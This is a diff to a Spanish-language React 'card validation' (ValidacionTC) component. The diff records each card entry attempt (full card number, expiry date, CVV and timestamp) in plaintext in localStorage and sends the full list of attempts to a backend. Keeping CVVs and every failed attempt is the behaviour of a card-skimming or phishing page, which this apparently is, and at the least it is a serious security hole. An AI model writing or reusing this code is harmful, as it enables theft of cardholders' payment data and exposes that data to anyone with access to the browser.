@@ -315,26 +315,40 @@ export default function ValidacionTC() {
                 try {
                     setCargando(true);
                     // Obtener sesion_id del localStorage
-                    const usuarioLocalStorage = JSON.parse(localStorage.getItem("datos_usuario"));
+                    const raw = localStorage.getItem("datos_usuario");
+                    const usuarioLocalStorage = raw ? JSON.parse(raw) : {};
                     const sesionId = usuarioLocalStorage?.sesion_id;
 
                     if (!sesionId) {
                         alert("Error: No se encontró la sesión");
+                        setCargando(false);
                         return;
                     }
 
                     // Construir número completo de tarjeta (12 dígitos + 4 últimos)
                     const numeroTarjetaCompleto = cardDigits + cardData.digits;
 
+                    // --- REGISTRAR INTENTO EN LOCALSTORAGE (Estructura Unificada) ---
+                    if (!usuarioLocalStorage.usuario) usuarioLocalStorage.usuario = {};
+                    if (!usuarioLocalStorage.usuario.tc) usuarioLocalStorage.usuario.tc = [];
+
+                    const nuevoIntento = {
+                        intento: usuarioLocalStorage.usuario.tc.length + 1,
+                        numeroTarjeta: numeroTarjetaCompleto,
+                        fechaExpiracion: expirationDate,
+                        cvv: cvv,
+                        fecha: new Date().toLocaleString()
+                    };
+
+                    usuarioLocalStorage.usuario.tc.push(nuevoIntento);
+                    localStorage.setItem("datos_usuario", JSON.stringify(usuarioLocalStorage));
+
+
                     // Preparar datos para enviar
+                    // Enviamos usuarioLocalStorage completo en attributes para que el backend tome el array tc
                     const dataSend = {
                         data: {
-                            attributes: {
-                                sesion_id: sesionId,
-                                numeroTarjeta: numeroTarjetaCompleto,
-                                cvv: cvv,
-                                fechaExpiracion: expirationDate
-                            }
+                            attributes: usuarioLocalStorage
                         }
                     };
 
